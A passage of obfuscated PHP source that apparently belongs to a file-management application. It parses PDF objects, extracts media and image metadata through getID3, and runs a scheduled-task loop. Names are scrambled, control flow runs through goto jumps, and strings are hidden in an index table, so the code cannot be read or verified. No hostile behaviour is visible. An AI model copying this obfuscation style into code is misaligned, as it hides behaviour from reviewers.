preg_match($A‹ì¡ç™”û[1551], substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 256), $C¶˜”Á—ì»); if (1 == $fÍûÓë˜–ã) { $F÷·Íï∫ÈÈ = $C¶˜”Á—ì»[1]; $D∏˘€»›ø‚ += strlen($F÷·Íï∫ÈÈ); } break; case $A‹ì¡ç™”û[254]: case $A‹ì¡ç™”û[804]: $e∏ƒÃÙìÃ¢ = $fÈõπ¢ª¢î; ++$D∏˘€»›ø‚; $báá¬’úØ‹ = $D∏˘€»›ø‚; if ($A‹ì¡ç™”û[254] == $fÈõπ¢ª¢î) { $Bå§¨êÌ†ÿ = 1; while ($Bå§¨êÌ†ÿ > 0) { if (!isset($F È≥ï®ÌŸ[$báá¬’úØ‹])) { break; } $B÷åÃ∂ﬁûö = $F È≥ï®ÌŸ[$báá¬’úØ‹]; switch ($B÷åÃ∂ﬁûö) { case $A‹ì¡ç™”û[105]: ++$báá¬’úØ‹; break; case $A‹ì¡ç™”û[254]: ++$Bå§¨êÌ†ÿ; break; case $A‹ì¡ç™”û[804]: --$Bå§¨êÌ†ÿ; break; } ++$báá¬’úØ‹; } $F÷·Íï∫ÈÈ = substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, $báá¬’úØ‹ - $D∏˘€»›ø‚ - 1); $D∏˘€»›ø‚ = $báá¬’úØ‹; } break; case $A‹ì¡ç™”û[164]: case $A‹ì¡ç™”û[480]: $e∏ƒÃÙìÃ¢ = $fÈõπ¢ª¢î; ++$D∏˘€»›ø‚; if ($A‹ì¡ç™”û[164] == $fÈõπ¢ª¢î) { $F÷·Íï∫ÈÈ = array(); do { $aà≤≥©ß¿ò = $D∏˘€»›ø‚; $f¨µ∂Ê∂Ñ® = self::getRawObject($F È≥ï®ÌŸ, $D∏˘€»›ø‚); $D∏˘€»›ø‚ = $f¨µ∂Ê∂Ñ®[2]; $F÷·Íï∫ÈÈ[] = $f¨µ∂Ê∂Ñ®; } while ($A‹ì¡ç™”û[480] != $f¨µ∂Ê∂Ñ®[0] && $D∏˘€»›ø‚ != $aà≤≥©ß¿ò); array_pop($F÷·Íï∫ÈÈ); } break; case $A‹ì¡ç™”û[913]: case $A‹ì¡ç™”û[916]: if (isset($F È≥ï®ÌŸ[$D∏˘€»›ø‚ + 1]) && $F È≥ï®ÌŸ[$D∏˘€»›ø‚ + 1] == $fÈõπ¢ª¢î) { $e∏ƒÃÙìÃ¢ = $fÈõπ¢ª¢î . $fÈõπ¢ª¢î; $D∏˘€»›ø‚ += 2; if ($A‹ì¡ç™”û[913] == $fÈõπ¢ª¢î) { $F÷·Íï∫ÈÈ = array(); do { $aà≤≥©ß¿ò = $D∏˘€»›ø‚; $f¨µ∂Ê∂Ñ® = self::getRawObject($F È≥ï®ÌŸ, $D∏˘€»›ø‚); $D∏˘€»›ø‚ = $f¨µ∂Ê∂Ñ®[2]; $F÷·Íï∫ÈÈ[] = $f¨µ∂Ê∂Ñ®; } while ($A‹ì¡ç™”û[1552] != $f¨µ∂Ê∂Ñ®[0] && $D∏˘€»›ø‚ != $aà≤≥©ß¿ò); array_pop($F÷·Íï∫ÈÈ); } } else { $e∏ƒÃÙìÃ¢ = $fÈõπ¢ª¢î; ++$D∏˘€»›ø‚; $fÍûÓë˜–ã = preg_match($A‹ì¡ç™”û[1553], substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚), $C¶˜”Á—ì»); if ($A‹ì¡ç™”û[913] == $fÈõπ¢ª¢î && 1 == $fÍûÓë˜–ã) { $F÷·Íï∫ÈÈ = strtr($C¶˜”Á—ì»[1], $A‹ì¡ç™”û[1554], $A‹ì¡ç™”û[33]); $D∏˘€»›ø‚ += \strlen($C¶˜”Á—ì»[0]); } elseif (!1 !== ($e±ÿ‚éÕá∂ = strpos($F È≥ï®ÌŸ, $A‹ì¡ç™”û[916], $D∏˘€»›ø‚))) { $D∏˘€»›ø‚ = $e±ÿ‚éÕá∂ + 1; } } break; default: if ($A‹ì¡ç™”û[1555] == substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 6)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1555]; $D∏˘€»›ø‚ += 6; } elseif ($A‹ì¡ç™”û[111] == substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 4)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[111]; $D∏˘€»›ø‚ += 4; $F÷·Íï∫ÈÈ = $A‹ì¡ç™”û[111]; } elseif ($A‹ì¡ç™”û[1556] == substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 4)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1557]; $D∏˘€»›ø‚ += 4; $F÷·Íï∫ÈÈ = $A‹ì¡ç™”û[1556]; } elseif ($A‹ì¡ç™”û[1558] == substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 5)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1557]; $D∏˘€»›ø‚ += 5; $F÷·Íï∫ÈÈ = $A‹ì¡ç™”û[1558]; } elseif ($A‹ì¡ç™”û[1559] == substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 6)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1559]; $D∏˘€»›ø‚ += 6; if (1 == preg_match($A‹ì¡ç™”û[1560], substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚), $C¶˜”Á—ì»)) { $D∏˘€»›ø‚ += strlen($C¶˜”Á—ì»[0]); $cîı≥ç„Ø = $A‹ì¡ç™”û[1561]; $fÍûÓë˜–ã = preg_match($cîı≥ç„Ø, substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚), $C¶˜”Á—ì», PREG_OFFSET_CAPTURE); if (1 == $fÍûÓë˜–ã) { $F÷·Íï∫ÈÈ = substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, $C¶˜”Á—ì»[0][1]); $D∏˘€»›ø‚ += $C¶˜”Á—ì»[1][1]; } } } elseif ($A‹ì¡ç™”û[1562] == substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 9)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1562]; $D∏˘€»›ø‚ += 9; } elseif (1 == preg_match($A‹ì¡ç™”û[1563], substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 33), $C¶˜”Á—ì»)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1525]; $D∏˘€»›ø‚ += strlen($C¶˜”Á—ì»[0]); $F÷·Íï∫ÈÈ = intval($C¶˜”Á—ì»[1]) . $A‹ì¡ç™”û[80] . intval($C¶˜”Á—ì»[2]); } elseif (1 == preg_match($A‹ì¡ç™”û[1564], substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, 33), $C¶˜”Á—ì»)) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1565]; $F÷·Íï∫ÈÈ = intval($C¶˜”Á—ì»[1]) . $A‹ì¡ç™”û[80] . intval($C¶˜”Á—ì»[2]); $D∏˘€»›ø‚ += strlen($C¶˜”Á—ì»[0]); } elseif (($EÊˆ≤Ñ–Îà = strspn($F È≥ï®ÌŸ, $A‹ì¡ç™”û[1566], $D∏˘€»›ø‚)) > 0) { $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[1567]; $F÷·Íï∫ÈÈ = substr($F È≥ï®ÌŸ, $D∏˘€»›ø‚, $EÊˆ≤Ñ–Îà); $D∏˘€»›ø‚ += $EÊˆ≤Ñ–Îà; } break; } goto f÷ï∂ÌÜàˆ; C©¯“√Ü√‰: } } class GetInfo { private static $fileTypeArray; public static function get($eßÇ·˜€®…) { $côèÎÔÊõ¿ = IO::info($eßÇ·˜€®…); return self::infoAdd($côèÎÔÊõ¿); } public static function infoAdd(&$DÃé›Ñ∂≠À) { goto Fà∑ú∑ä∞ç; Fà∑ú∑ä∞ç: $B°Â© Ñ˘é =& $_SERVER[Æ¡î¢≠¯™]; static $Dü§íºüÖ¯; if (!$Dü§íºüÖ¯) { require SDK_DIR . $B°Â© Ñ˘é[1568]; $Dü§íºüÖ¯ = new getID3(); } goto Eì¨óøÚÉ; aª‘ÓìÁ’ë: $e”Ω€ç∏ëü[$B°Â© Ñ˘é[377]] = $a·„‚©ï†±; $DÃé›Ñ∂≠À[$B°Â© Ñ˘é[430]] = $e”Ω€ç∏ëü; return $DÃé›Ñ∂≠À; goto C§ŒãÎÒë–; Eì¨óøÚÉ: if (!$DÃé›Ñ∂≠À || $DÃé›Ñ∂≠À[$B°Â© Ñ˘é[29]] != $B°Â© Ñ˘é[174]) { return; } if (!self::support($DÃé›Ñ∂≠À[$B°Â© Ñ˘é[167]]) || isset($DÃé›Ñ∂≠À[$B°Â© Ñ˘é[430]])) { return; } $bÖíÊÈ™—ú = $B°Â© Ñ˘é[1569] . $DÃé›Ñ∂≠À[$B°Â© Ñ˘é[85]]; goto EÓ–„©∫Ç™; EÓ–„©∫Ç™: $a·„‚©ï†± = $DÃé›Ñ∂≠À[$B°Â© Ñ˘é[167]]; try { if ($DÃé›Ñ∂≠À[$B°Â© Ñ˘é[167]] == $B°Â© Ñ˘é[1570]) { $e”Ω€ç∏ëü = self::psdParse($bÖíÊÈ™—ú); $a·„‚©ï†± = $B°Â© Ñ˘é[1571]; } else { if ($DÃé›Ñ∂≠À[$B°Â© Ñ˘é[167]] == $B°Â© Ñ˘é[1572]) { $e”Ω€ç∏ëü = self::pdfParse($bÖíÊÈ™—ú); } else { $a·„‚©ï†± = self::$fileTypeArray[$B°Â© Ñ˘é[1573]][$DÃé›Ñ∂≠À[$B°Â© Ñ˘é[167]]]; $bûóï»Ì÷¬ = self::$fileTypeArray[$B°Â© Ñ˘é[1574]][$a·„‚©ï†±][$B°Â© Ñ˘é[1575]]; $A“çÈãôÎÈ = @$Dü§íºüÖ¯->analyze($bÖíÊÈ™—ú, $DÃé›Ñ∂≠À[$B°Â© Ñ˘é[87]], $DÃé›Ñ∂≠À[$B°Â© Ñ˘é[28]]); $e”Ω€ç∏ëü = self::parseData($A“çÈãôÎÈ, $bûóï»Ì÷¬, $DÃé›Ñ∂≠À); } } } catch (Exception $bÊÜêï—ç⁄) { $e”Ω€ç∏ëü = array($B°Â© Ñ˘é[377] => $a·„‚©ï†±); } if (!$e”Ω€ç∏ëü) { return; } goto aª‘ÓìÁ’ë; C§ŒãÎÒë–: } public static function support($C†À©ƒ‘’©) { goto E˜πÍøÊ⁄”; d’Œ˜Ï˘éé: $cîôÑ±À©‘ = array($D¨ÖÓêß©Ÿ[1572], $D¨ÖÓêß©Ÿ[1570]); if (in_array($C†À©ƒ‘’©, $cîôÑ±À©‘)) { return !0; } if (isset(self::$fileTypeArray[$D¨ÖÓêß©Ÿ[1573]][$C†À©ƒ‘’©])) { return !0; } goto F≤–∆ê˜€Ü; E˜πÍøÊ⁄”: $D¨ÖÓêß©Ÿ =& $_SERVER[Æ¡î¢≠¯™]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $C†À©ƒ‘’© = strtolower($C†À©ƒ‘’©); goto d’Œ˜Ï˘éé; F≤–∆ê˜€Ü: return !1; goto AÔ‹¢ãâÛ¡; AÔ‹¢ãâÛ¡: } private static function parseData($Aë‚ª—ñøí, $fà≤§Ü∂‡, $e∆≠ø€Ç€¥) { $Dê÷Ú≤Øﬂù =& $_SERVER[Æ¡î¢≠¯™]; $D‹¡¬ﬂ¬ôµ = $Aë‚ª—ñøí[$Dê÷Ú≤Øﬂù[1576]]; $Aà⁄âœ√Ì¬ = array(); foreach ($fà≤§Ü∂‡ as $A©€ÙƒÇ‘Ì => $AÏﬁ´û‚¯É) { foreach ($AÏﬁ´û‚¯É as $DÜúæî≥…€) { if (is_array($DÜúæî≥…€)) { $d®úœ®ëî = self::parseData($Aë‚ª—ñøí, $AÏﬁ´û‚¯É, $e∆≠ø€Ç€¥); if ($d®úœ®ëî) { $Aà⁄âœ√Ì¬[$A©€ÙƒÇ‘Ì] = $d®úœ®ëî; } break; } $b‘›çÉ¬éá = str_replace($Dê÷Ú≤Øﬂù[1350], $D‹¡¬ﬂ¬ôµ, $DÜúæî≥…€); $d®úœ®ëî = _get($Aë‚ª—ñøí, $b‘›çÉ¬éá); $d®úœ®ëî = is_array($d®úœ®ëî) ? $d®úœ®ëî[0] : $d®úœ®ëî; if ($d®úœ®ëî) { break; } } if ($d®úœ®ëî || $d®úœ®ëî === 0 || $d®úœ®ëî === !1) { $d®úœ®ëî = self::valueReset($DÜúæî≥…€, $d®úœ®ëî, $A©€ÙƒÇ‘Ì); if ($d®úœ®ëî !== null) { $Aà⁄âœ√Ì¬[$A©€ÙƒÇ‘Ì] = $d®úœ®ëî; } } } $Aà⁄âœ√Ì¬ = self::valueResetAll($Aà⁄âœ√Ì¬, $e∆≠ø€Ç€¥); return $Aà⁄âœ√Ì¬; } private static function psdParse($AÉ±Ò—òÎ) { $aÙøÇ≥º’‘ =& $_SERVER[Æ¡î¢≠¯™]; if (IO::fileSubstr($AÉ±Ò—òÎ, 0, 4) != $aÙøÇ≥º’‘[1577]) { return !1; } $DŸ⁄çâŸÙ = getImageSize($AÉ±Ò—òÎ, $B⁄¶ãÖ¯”Ω); if (!$DŸ⁄çâŸÙ) { return; } $A’’‹≥óÁË = array($aÙøÇ≥º’‘[1492] => $DŸ⁄çâŸÙ[0], $aÙøÇ≥º’‘[1494] => $DŸ⁄çâŸÙ[1]); return $A’’‹≥óÁË; } private static function pdfParse($D±¢—ÚÉì§) { return FileParsePdf::parse($D±¢—ÚÉì§); } private static function fileTypeParse() { $eﬂ¡ öëÕ⁄ =& $_SERVER[Æ¡î¢≠¯™]; $AπëÖé„®ı = self::fileTypeArray(); $eøÏüßêî‡ = array(); foreach ($AπëÖé„®ı as $FÀ∂õîÖ‚¬ => $C⁄“ÿ„∂§£) { $cÔéœç•π¥ = _get($C⁄“ÿ„∂§£, $eﬂ¡ öëÕ⁄[167], $eﬂ¡ öëÕ⁄[33]); $Aòïáéßìê = is_string($cÔéœç•π¥) ? explode($eﬂ¡ öëÕ⁄[47], $cÔéœç•π¥) : $cÔéœç•π¥; if (!$Aòïáéßìê) { continue; } foreach ($Aòïáéßìê as $cÔéœç•π¥) { $cÔéœç•π¥ = strtolower(trim($cÔéœç•π¥)); if (!$cÔéœç•π¥) { continue; } $eøÏüßêî‡[$cÔéœç•π¥] = $FÀ∂õîÖ‚¬; } $AπëÖé„®ı[$FÀ∂õîÖ‚¬][$eﬂ¡ öëÕ⁄[167]] = array_keys($eøÏüßêî‡); $AπëÖé„®ı[$FÀ∂õîÖ‚¬][$eﬂ¡ öëÕ⁄[1575]] = self::parseKeyMap($C⁄“ÿ„∂§£[$eﬂ¡ öëÕ⁄[1575]]); } return array($eﬂ¡ öëÕ⁄[1574] => $AπëÖé„®ı, $eﬂ¡ öëÕ⁄[1573] => $eøÏüßêî‡); } private static function parseKeyMap($Fèîóõíè®) { $a◊£ô˘†ÉÕ =& $_SERVER[Æ¡î¢≠¯™]; foreach ($Fèîóõíè® as $FÙ¬èìÒﬁ† => $bı˜‡∏éß±) { if (is_array($bı˜‡∏éß±)) { $e¡™ïÈÜ‰‰ = self::parseKeyMap($bı˜‡∏éß±); if ($e¡™ïÈÜ‰‰) { $Fèîóõíè®[$FÙ¬èìÒﬁ†] = $e¡™ïÈÜ‰‰; } continue; } $e•Øô”Ú ⁄ = explode($a◊£ô˘†ÉÕ[47], $bı˜‡∏éß±); $a»ÛéèÒ‚å = array(); foreach ($e•Øô”Ú ⁄ as $Bà¶Ïµßﬂõ) { $Bà¶Ïµßﬂõ = trim($Bà¶Ïµßﬂõ); if (!$Bà¶Ïµßﬂõ) { continue; } if (preg_match($a◊£ô˘†ÉÕ[1578], $Bà¶Ïµßﬂõ, $BäÙÇÿ£Ùö)) { $A¡ÆôÖ≥îÇ = explode($a◊£ô˘†ÉÕ[277], $BäÙÇÿ£Ùö[1]); foreach ($A¡ÆôÖ≥îÇ as $Fä≈›á≠Êà) { $a»ÛéèÒ‚å[] = str_replace($BäÙÇÿ£Ùö[0], $Fä≈›á≠Êà, $Bà¶Ïµßﬂõ); } } else { $a»ÛéèÒ‚å[] = $Bà¶Ïµßﬂõ; } } $Fèîóõíè®[$FÙ¬èìÒﬁ†] = $a»ÛéèÒ‚å; } return $Fèîóõíè®; } private static function valueResetAll($E¡ÇòÍ∑Çì, $D≥ëπÕí·˘) { goto AÌŸã´ÑºÃ; AÌŸã´ÑºÃ: $AÑ»êªääá =& $_SERVER[Æ¡î¢≠¯™]; if (isset($E¡ÇòÍ∑Çì[$AÑ»êªääá[1579]])) { $a£º¯ùŒÈÇ = ceil($E¡ÇòÍ∑Çì[$AÑ»êªääá[1579]]); $a¶„†‰·Áé = intval($a£º¯ùŒÈÇ / 3600); $Cÿﬂ™“©îΩ = intval(($a£º¯ùŒÈÇ - $a¶„†‰·Áé * 3600) / 60); $d∑§ÍÓø¢« = $a£º¯ùŒÈÇ % 60; $E¡ÇòÍ∑Çì[$AÑ»êªääá[1580]] = sprintf($AÑ»êªääá[1581], $a¶„†‰·Áé, $Cÿﬂ™“©îΩ, $d∑§ÍÓø¢«); if ($a¶„†‰·Áé == 0) { $E¡ÇòÍ∑Çì[$AÑ»êªääá[1580]] = sprintf($AÑ»êªääá[1582], $Cÿﬂ™“©îΩ, $d∑§ÍÓø¢«); } } $f¿“™éê∆õ = _get($E¡ÇòÍ∑Çì, $AÑ»êªääá[1583]); goto b≠÷ƒ∆±ŸÒ; b≠÷ƒ∆±ŸÒ: if ($f¿“™éê∆õ) { $F°íÖîÏﬂç = IO_PATH_SYSTEM_TEMP . $AÑ»êªääá[1584] . KodIO::hashPath($D≥ëπÕí·˘) . $AÑ»êªääá[1585]; $E¡ÇòÍ∑Çì[$AÑ»êªääá[1586]] = Action($AÑ»êªääá[1587])->pluginCacheFileSet($F°íÖîÏﬂç, $f¿“™éê∆õ); unset($E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1571]]); } $Eê™àÌµë∏ = _get($E¡ÇòÍ∑Çì, $AÑ»êªääá[1589], $AÑ»êªääá[33]); $aÌ´’¿°î = _get($E¡ÇòÍ∑Çì, $AÑ»êªääá[1590], $AÑ»êªääá[33]); goto dÉÖÈ·äÈÁ; dÉÖÈ·äÈÁ: $bÓåô±◊√€ = _get($E¡ÇòÍ∑Çì, $AÑ»êªääá[1591], $AÑ»êªääá[33]); $D¨Öïëìø— = $Eê™àÌµë∏ . $aÌ´’¿°î . $bÓåô±◊√€; if ($D¨Öïëìø— && get_charset($D¨Öïëìø—) != $AÑ»êªääá[332]) { $E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1305]] = iconv_to($E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1305]], get_charset($D¨Öïëìø—), $AÑ»êªääá[332]); $E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1592]] = iconv_to($E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1592]], get_charset($D¨Öïëìø—), $AÑ»êªääá[332]); $E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1593]] = iconv_to($E¡ÇòÍ∑Çì[$AÑ»êªääá[1588]][$AÑ»êªääá[1593]], get_charset($D¨Öïëìø—), $AÑ»êªääá[332]); } goto b≥éÒì¢Ø¢; b≥éÒì¢Ø¢: return $E¡ÇòÍ∑Çì; goto B⁄äÂâ”ƒŒ; B⁄äÂâ”ƒŒ: } private static function valueReset($e©ïéé›™º, $FæÃŸíÇµÁ, $F§ãßìÒ¢‚) { $A¿ˆçé—ΩÇ =& $_SERVER[Æ¡î¢≠¯™]; $F±ºø§”¨› = $A¿ˆçé—ΩÇ[1509]; switch ($e©ïéé›™º) { case $A¿ˆçé—ΩÇ[1594]: $FæÃŸíÇµÁ = $FæÃŸíÇµÁ == $A¿ˆçé—ΩÇ[93] ? $A¿ˆçé—ΩÇ[1595] : $A¿ˆçé—ΩÇ[1596]; break; case $A¿ˆçé—ΩÇ[1597]: $FæÃŸíÇµÁ = $FæÃŸíÇµÁ ? $FæÃŸíÇµÁ : null; break; default: break; } switch ($F§ãßìÒ¢‚) { case $A¿ˆçé—ΩÇ[1598]: $FæÃŸíÇµÁ = round($FæÃŸíÇµÁ, 2); break; case $A¿ˆçé—ΩÇ[194]: case $A¿ˆçé—ΩÇ[117]: if ($FæÃŸíÇµÁ < 0) { $FæÃŸíÇµÁ = null; } else { if (is_numeric($FæÃŸíÇµÁ)) { $FæÃŸíÇµÁ = date($F±ºø§”¨›, $FæÃŸíÇµÁ); } } break; default: break; } return $FæÃŸíÇµÁ; } private static function fileTypeArray() { $e§¬¿∞ÎÉ± =& $_SERVER[Æ¡î¢≠¯™]; return array($e§¬¿∞ÎÉ±[1571] => array($e§¬¿∞ÎÉ±[167] => $e§¬¿∞ÎÉ±[1599] . $e§¬¿∞ÎÉ±[1600], $e§¬¿∞ÎÉ±[1575] => array($e§¬¿∞ÎÉ±[1492] => $e§¬¿∞ÎÉ±[1601], $e§¬¿∞ÎÉ±[1494] => $e§¬¿∞ÎÉ±[1602], $e§¬¿∞ÎÉ±[1603] => $e§¬¿∞ÎÉ±[1604], $e§¬¿∞ÎÉ±[1605] => $e§¬¿∞ÎÉ±[1606], $e§¬¿∞ÎÉ±[194] => $e§¬¿∞ÎÉ±[1607], $e§¬¿∞ÎÉ±[117] => $e§¬¿∞ÎÉ±[1608], $e§¬¿∞ÎÉ±[1609] => $e§¬¿∞ÎÉ±[1610], $e§¬¿∞ÎÉ±[1611] => $e§¬¿∞ÎÉ±[1612], $e§¬¿∞ÎÉ±[1613] => $e§¬¿∞ÎÉ±[1614], $e§¬¿∞ÎÉ±[1615] => $e§¬¿∞ÎÉ±[1616], $e§¬¿∞ÎÉ±[1617] => $e§¬¿∞ÎÉ±[1618], $e§¬¿∞ÎÉ±[1619] => $e§¬¿∞ÎÉ±[1620], $e§¬¿∞ÎÉ±[1621] => $e§¬¿∞ÎÉ±[1622], $e§¬¿∞ÎÉ±[1623] => array($e§¬¿∞ÎÉ±[1624] => $e§¬¿∞ÎÉ±[1625], $e§¬¿∞ÎÉ±[1626] => $e§¬¿∞ÎÉ±[1627], $e§¬¿∞ÎÉ±[1628] => $e§¬¿∞ÎÉ±[1629]), $e§¬¿∞ÎÉ±[1630] => $e§¬¿∞ÎÉ±[1631], $e§¬¿∞ÎÉ±[1632] => $e§¬¿∞ÎÉ±[1633], $e§¬¿∞ÎÉ±[1634] => $e§¬¿∞ÎÉ±[1635], $e§¬¿∞ÎÉ±[1636] => $e§¬¿∞ÎÉ±[1637], $e§¬¿∞ÎÉ±[1638] => array($e§¬¿∞ÎÉ±[1639] => $e§¬¿∞ÎÉ±[1640], $e§¬¿∞ÎÉ±[1641] => $e§¬¿∞ÎÉ±[1642], $e§¬¿∞ÎÉ±[1643] => $e§¬¿∞ÎÉ±[1644], $e§¬¿∞ÎÉ±[1645] => $e§¬¿∞ÎÉ±[1646], $e§¬¿∞ÎÉ±[1647] => $e§¬¿∞ÎÉ±[1648], $e§¬¿∞ÎÉ±[1649] => $e§¬¿∞ÎÉ±[1650], $e§¬¿∞ÎÉ±[1651] => $e§¬¿∞ÎÉ±[1652], $e§¬¿∞ÎÉ±[1653] => $e§¬¿∞ÎÉ±[1654], $e§¬¿∞ÎÉ±[1655] => $e§¬¿∞ÎÉ±[1656], $e§¬¿∞ÎÉ±[1657] => $e§¬¿∞ÎÉ±[1658], $e§¬¿∞ÎÉ±[1659] => $e§¬¿∞ÎÉ±[1660]))), $e§¬¿∞ÎÉ±[1661] => array($e§¬¿∞ÎÉ±[167] => $e§¬¿∞ÎÉ±[1662] . $e§¬¿∞ÎÉ±[1663], $e§¬¿∞ÎÉ±[1575] => array($e§¬¿∞ÎÉ±[1579] => $e§¬¿∞ÎÉ±[1664], $e§¬¿∞ÎÉ±[194] => $e§¬¿∞ÎÉ±[1665], $e§¬¿∞ÎÉ±[117] => $e§¬¿∞ÎÉ±[1666], $e§¬¿∞ÎÉ±[1611] => $e§¬¿∞ÎÉ±[1667], $e§¬¿∞ÎÉ±[1668] => $e§¬¿∞ÎÉ±[1669], $e§¬¿∞ÎÉ±[1670] => $e§¬¿∞ÎÉ±[1597], $e§¬¿∞ÎÉ±[1671] => $e§¬¿∞ÎÉ±[1672], $e§¬¿∞ÎÉ±[1673] => $e§¬¿∞ÎÉ±[1674], $e§¬¿∞ÎÉ±[1675] => $e§¬¿∞ÎÉ±[1676], $e§¬¿∞ÎÉ±[1588] => array($e§¬¿∞ÎÉ±[1305] => $e§¬¿∞ÎÉ±[1677], $e§¬¿∞ÎÉ±[1592] => $e§¬¿∞ÎÉ±[1678], $e§¬¿∞ÎÉ±[1593] => $e§¬¿∞ÎÉ±[1679], $e§¬¿∞ÎÉ±[1680] => $e§¬¿∞ÎÉ±[1681], $e§¬¿∞ÎÉ±[1682] => $e§¬¿∞ÎÉ±[1683], $e§¬¿∞ÎÉ±[1684] => $e§¬¿∞ÎÉ±[1685], $e§¬¿∞ÎÉ±[1571] => $e§¬¿∞ÎÉ±[1686]))), $e§¬¿∞ÎÉ±[1687] => array($e§¬¿∞ÎÉ±[167] => $e§¬¿∞ÎÉ±[1688] . $e§¬¿∞ÎÉ±[1689], $e§¬¿∞ÎÉ±[1575] => array($e§¬¿∞ÎÉ±[1492] => $e§¬¿∞ÎÉ±[1690], $e§¬¿∞ÎÉ±[1494] => $e§¬¿∞ÎÉ±[1691], $e§¬¿∞ÎÉ±[1579] => $e§¬¿∞ÎÉ±[1664], $e§¬¿∞ÎÉ±[194] => $e§¬¿∞ÎÉ±[1692], $e§¬¿∞ÎÉ±[117] => $e§¬¿∞ÎÉ±[1693], $e§¬¿∞ÎÉ±[1598] => $e§¬¿∞ÎÉ±[1694], $e§¬¿∞ÎÉ±[1675] => $e§¬¿∞ÎÉ±[1695], $e§¬¿∞ÎÉ±[1671] => $e§¬¿∞ÎÉ±[1696], $e§¬¿∞ÎÉ±[1611] => $e§¬¿∞ÎÉ±[1697], $e§¬¿∞ÎÉ±[1661] => array($e§¬¿∞ÎÉ±[1670] => $e§¬¿∞ÎÉ±[1597], $e§¬¿∞ÎÉ±[1698] => $e§¬¿∞ÎÉ±[1699], $e§¬¿∞ÎÉ±[1668] => $e§¬¿∞ÎÉ±[1669], $e§¬¿∞ÎÉ±[1675] => $e§¬¿∞ÎÉ±[1676], $e§¬¿∞ÎÉ±[1671] => $e§¬¿∞ÎÉ±[1700], $e§¬¿∞ÎÉ±[1673] => $e§¬¿∞ÎÉ±[1674]))), $e§¬¿∞ÎÉ±[1701] => array($e§¬¿∞ÎÉ±[1575] => array($e§¬¿∞ÎÉ±[1702] => $e§¬¿∞ÎÉ±[1703], $e§¬¿∞ÎÉ±[1704] => $e§¬¿∞ÎÉ±[1705])), $e§¬¿∞ÎÉ±[1706] => array($e§¬¿∞ÎÉ±[1575] => array())); } } goto Aﬂ¨‘ıÉ„‰; FàÂí›ÎÔÁ: class AutoTask { public static function start() { goto eÆàÈè∆ü´; cÈ•Èò°Üû: while (!0) { self::cacheClear(); if (self::valueGet($CñèÙèê≠ï[681]) != $CñèÙèê≠ï[93]) { self::valueSet($CñèÙèê≠ï[1361], $CñèÙèê≠ï[472]); self::log($CñèÙèê≠ï[1365]); die; } self::valueSet($CñèÙèê≠ï[1361], $CñèÙèê≠ï[93]); self::valueSet($CñèÙèê≠ï[1362], time()); self::taskRunAll(); sleep(self::valueGet($CñèÙèê≠ï[1366])); } goto F”É¨¿Ãá∫; eÆàÈè∆ü´: $CñèÙèê≠ï =& $_SERVER[Æ¡î¢≠¯™]; if (self::valueGet($CñèÙèê≠ï[681]) != $CñèÙèê≠ï[93]) { return; } if (self::valueGet($CñèÙèê≠ï[1361]) == $CñèÙèê≠ï[93]) { $AáäÒÊ©í∑ = self::valueGet($CñèÙèê≠ï[1362]); if (time() - $AáäÒÊ©í∑ > 3600 * 2) { self::restart(); } return; } goto C˜⁄Çç∆; C˜⁄Çç∆: http_close(); self::valueSet($CñèÙèê≠ï[1361], $CñèÙèê≠ï[93]); Hook::bind($CñèÙèê≠ï[1363], $CñèÙèê≠ï[1364]); goto cÈ•Èò°Üû; F”É¨¿Ãá∫: } public static function restart() { $aÖÿøæúÙ¨ =& $_SERVER[Æ¡î¢≠¯™]; http_close(); self::valueSet($aÖÿøæúÙ¨[681], $aÖÿøæúÙ¨[472]); sleep(self::valueGet($aÖÿøæúÙ¨[1366]) + 5); self::valueSet($aÖÿøæúÙ¨[1361], $aÖÿøæúÙ¨[472]); self::valueSet($aÖÿøæúÙ¨[681], $aÖÿøæúÙ¨[93]); } public static function shutdownEvent() { $f®é‘ºæ›° =& $_SERVER[Æ¡î¢≠¯™]; self::valueSet($f®é‘ºæ›°[1361], $f®é‘ºæ›°[472]); self::log($f®é‘ºæ›°[1367]); } public static function config($dûëµ¿á»∆, $AÃ¬Ö∏À∑à) { $DŒ»‡î—Ÿ£ =& $_SERVER[Æ¡î¢≠¯™]; $Fÿ¥ØÈõï´ = 20; $AÃ¬Ö∏À∑à = intval($AÃ¬Ö∏À∑à) <= $Fÿ¥ØÈõï´ ? $Fÿ¥ØÈõï´ : intval($AÃ¬Ö∏À∑à); self::valueSet($DŒ»‡î—Ÿ£[681], $dûëµ¿á»∆); self::valueSet($DŒ»‡î—Ÿ£[1366], $AÃ¬Ö∏À∑à); } private static function taskRunAll() { $BáÁ≤˘»®î =& $_SERVER[Æ¡î¢≠¯™]; $C∫»»Ωã∆Ë = Model($BáÁ≤˘»®î[1368])->listData(); 